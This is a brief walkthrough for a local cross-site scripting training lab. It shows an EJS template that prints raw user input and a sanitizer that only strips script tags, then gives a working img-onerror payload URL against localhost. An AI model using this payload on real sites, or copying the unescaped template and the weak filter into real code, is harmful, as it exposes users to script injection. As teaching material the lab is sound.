# XSS Lab 3 - Walkthrough

## What's the bug?

The search page reflects your input directly into the HTML without escaping it.

In `views/search.ejs`:
```html
Showing results for: <strong><%- query %></strong>
```

`<%-` = raw HTML output. Whatever you type becomes part of the page.

The only "protection" is this sanitizer in `server.js`:
```js
input.replace(/<script>/gi, '').replace(/<\/script>/gi, '')
```

It only removes `<script>` tags. Everything else passes through.

---

## Exploit

You don't need `<script>` tags to run JavaScript. Use an image with a broken `src` - the browser fires `onerror` automatically:

```
http://localhost:3000/search?q=<img src=x onerror=alert(1)>
```

Visit that URL. Alert fires. XSS confirmed.

---

## Run it

```bash
docker build -t xss-lab3 .
docker run --rm -p 3000:3000 --name xss-lab3 xss-lab3
```
